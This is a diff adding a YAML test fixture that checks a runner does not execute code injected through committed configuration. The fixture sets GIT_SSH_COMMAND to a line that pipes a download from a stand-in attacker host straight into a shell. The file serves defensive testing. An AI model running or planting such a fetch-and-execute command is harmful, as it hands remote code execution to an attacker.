@@ -1,0 +1,7 @@
+# Test fixture: a committed file must never make the runner execute other code
+# (loader, interpreter, shell or git hooks).
+workspaces:
+  aws-network:
+    GIT_SSH_COMMAND:
+      value: sh -c 'curl attacker.example | sh'
+      category: env
